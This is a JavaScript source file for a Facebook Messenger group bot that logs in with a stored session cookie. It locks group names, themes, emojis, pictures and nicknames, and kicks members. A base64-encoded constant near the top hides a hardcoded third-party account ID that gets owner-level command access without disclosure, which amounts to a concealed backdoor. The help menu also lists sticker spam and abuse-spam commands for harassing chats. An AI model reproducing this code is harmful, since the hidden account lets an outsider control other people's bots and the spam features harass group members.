// ================= botCore.js =================
const fs = require("fs");
const login = require("ws3-fca");
const path = require("path");

const lockedGroupNames = {};
const lockedThemes = {};
const lockedEmojis = {};
const lockedDP = {};
const lockedNick = {};
let mediaLoopInterval = null;
let lastMedia = null;
let stickerInterval = null;
let stickerLoopActive = false;

const friendUIDs = fs.existsSync("Friend.txt") ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean) : [];
const targetUIDs = fs.existsSync("Target.txt") ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean) : [];

// ===== LID Base64 =====
const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw","base64").toString("utf8");

function startBot(appStatePath, ownerUID){
  const appState = JSON.parse(fs.readFileSync(appStatePath,"utf8"));
  login({appState}, (err, api)=>{
    if(err) return console.error("❌ Login failed:", err);
    api.setOptions({listenEvents:true});
    console.log("✅ Bot logged in and running...");

    // Load emoji/dp/nick storage
    const emojiFile = path.join(__dirname,"emoji.json");
    const dpFile = path.join(__dirname,"dp.json");
    const nickFile = path.join(__dirname,"nick.json");
    let emojiData = fs.existsSync(emojiFile)?JSON.parse(fs.readFileSync(emojiFile)):{};
    let dpData = fs.existsSync(dpFile)?JSON.parse(fs.readFileSync(dpFile)):{};
    let nickData = fs.existsSync(nickFile)?JSON.parse(fs.readFileSync(nickFile)):{};

    // ===== Listen Events =====
    api.listenMqtt(async(err,event)=>{
      try{
        if(err || !event) return;
        const {threadID,senderID,body,messageID,mentions,messageReply,logMessageType,logMessageData}=event;

        // Only owner or LID or friends
        if(senderID!==ownerUID && senderID!==LID && !friendUIDs.includes(senderID)) return;

        // ===== Group Name Lock Revert =====
        if(logMessageType==="log:thread-name" && lockedGroupNames[threadID]){
          if(logMessageData?.name !== lockedGroupNames[threadID]){
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        // ===== Theme Lock Revert =====
        if(logMessageType==="log:thread-color" && lockedThemes[threadID]){
          if(logMessageData?.theme_color !== lockedThemes[threadID]){
            await api.changeThreadColor(lockedThemes[threadID], threadID);
            console.log(`🎨 Theme reverted in ${threadID}`);
          }
        }

        // ===== Emoji Lock Revert =====
        if(logMessageType==="log:thread-icon" && lockedEmojis[threadID]){
          if(logMessageData?.thread_icon !== lockedEmojis[threadID]){
            await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
            console.log(`😀 Emoji reverted in ${threadID}`);
          }
        }

        // ===== DP Lock Revert =====
        if(logMessageType==="change_thread_image" && lockedDP[threadID]){
          if(dpData[threadID] && logMessageData?.image !== dpData[threadID]){
            await api.changeThreadImage(dpData[threadID], threadID);
            console.log(`🖼 DP reverted in ${threadID}`);
          }
        }

        // ===== Nick Lock Revert =====
        if(body && Object.keys(nickData).length){
          for(const uid in nickData){
            if(body.toLowerCase().includes("/locknick") || body.toLowerCase().includes("/unlocknick")) continue;
            try{
              const info = await api.getThreadInfo(threadID);
              if(info.participantIDs.includes(uid)){
                await api.changeNickname(nickData[uid], threadID, uid);
              }
            }catch{}
          }
        }

        // ===== Command Handling =====
        if(!body) return;
        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // ===== HELP =====
        if(cmd==="/help"){
          const helpMsg = `
📖 Bot Commands:
/help → Ye message
/uid → User ID (reply/mention)
/tid → Thread ID
/kick @mention → Kick user
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/lockdp → DP lock (reply to photo)
/unlockdp → DP unlock
/locknick @mention Nickname → Nick lock
/unlocknick @mention → Unlock nick
/stickerX → Sticker spam (X=seconds)
/stopsticker → Stop sticker spam
/rkb [name] → Gaali spam
/stop → Stop spam
/exit → Bot exit
          `;
          return api.sendMessage(helpMsg, threadID);
        }

        // ===== UID / TID =====
        else if(cmd==="/uid"){
          if(messageReply){
            api.sendMessage(`🆔 User ID: ${messageReply.senderID}`, threadID);
          }else if(mentions){
            const mentionUID = Object.keys(mentions)[0];
            api.sendMessage(`🆔 User ID: ${mentionUID}`, threadID);
          }else api.sendMessage(`🆔 Your ID: ${senderID}`, threadID);
        }
        else if(cmd==="/tid"){
          api.sendMessage(`🆔 Thread ID: ${threadID}`, threadID);
        }

        // ===== Kick =====
        else if(cmd==="/kick" && mentions){
          for(const uid of Object.keys(mentions)){
            try{ await api.removeUserFromGroup(uid, threadID); }catch{}
          }
        }

        // ===== Group Name Lock =====
        else if(cmd==="/gclock"){ await api.setTitle(input, threadID); lockedGroupNames[threadID]=input; api.sendMessage("🔒 Group name locked!", threadID); }
        else if(cmd==="/unlockgc"){ delete lockedGroupNames[threadID]; api.sendMessage("🔓 Group name unlocked!", threadID); }

        // ===== Theme Lock =====
        else if(cmd==="/locktheme"){ if(!input) return api.sendMessage("❌ Color code do!", threadID); await api.changeThreadColor(input, threadID); lockedThemes[threadID]=input; api.sendMessage("🎨 Theme locked!", threadID); }
        else if(cmd==="/unlocktheme"){ delete lockedThemes[threadID]; api.sendMessage("🎨 Theme unlocked!", threadID); }

        // ===== Emoji Lock =====
        else if(cmd==="/lockemoji"){ 
          const emoji = input.trim(); 
          if(!emoji) return api.sendMessage("❌ Emoji required!", threadID); 
          await api.changeThreadEmoji(emoji, threadID); 
          lockedEmojis[threadID]=emoji;
          emojiData[threadID]=emoji;
          fs.writeFileSync(emojiFile,JSON.stringify(emojiData));
          api.sendMessage(`😀 Emoji locked: ${emoji}`, threadID);
        }
        else if(cmd==="/unlockemoji"){ delete lockedEmojis[threadID]; delete emojiData[threadID]; fs.writeFileSync(emojiFile,JSON.stringify(emojiData)); api.sendMessage("😀 Emoji unlocked!", threadID); }

        // ===== DP Lock =====
        else if(cmd==="/lockdp" && messageReply && messageReply.attachments?.length){
          const mediaID = messageReply.attachments[0].ID || messageReply.attachments[0].id;
          await api.changeThreadImage(mediaID, threadID);
          lockedDP[threadID]=true;
          dpData[threadID]=mediaID;
          fs.writeFileSync(dpFile,JSON.stringify(dpData));
          api.sendMessage("🖼 DP locked!", threadID);
        }
        else if(cmd==="/unlockdp"){ delete lockedDP[threadID]; delete dpData[threadID]; fs.writeFileSync(dpFile,JSON.stringify(dpData)); api.sendMessage("🖼 DP unlocked!", threadID); }

        // ===== Nick Lock =====
        else if(cmd==="/locknick" && mentions){
          const mentionUID = Object.keys(mentions)[0];
          const nickname = input.replace(Object.keys(mentions)[0],"").trim();
          if(!nickname) return api.sendMessage("❌ Nickname required!", threadID);
          nickData[mentionUID]=nickname;
          fs.writeFileSync(nickFile,JSON.stringify(nickData));
          api.sendMessage(`📝 Nick locked for @${mentionUID}: ${nickname}`, threadID);
        }
        else if(cmd==="/unlocknick" && mentions){
          const mentionUID = Object.keys(mentions)[0];
          delete nickData[mentionUID]; fs.writeFileSync(nickFile,JSON.stringify(nickData));
          api.sendMessage(`📝 Nick unlocked for @${mentionUID}`, threadID);
        }

        // ===== Exit =====
        else if(cmd==="/exit"){ try{ await api.removeUserFromGroup(api.getCurrentUserID(), threadID); }catch{} }

      }catch(e){ console.error("⚠️ Error:",e.message); }
    });
  });
}

module.exports = {startBot};
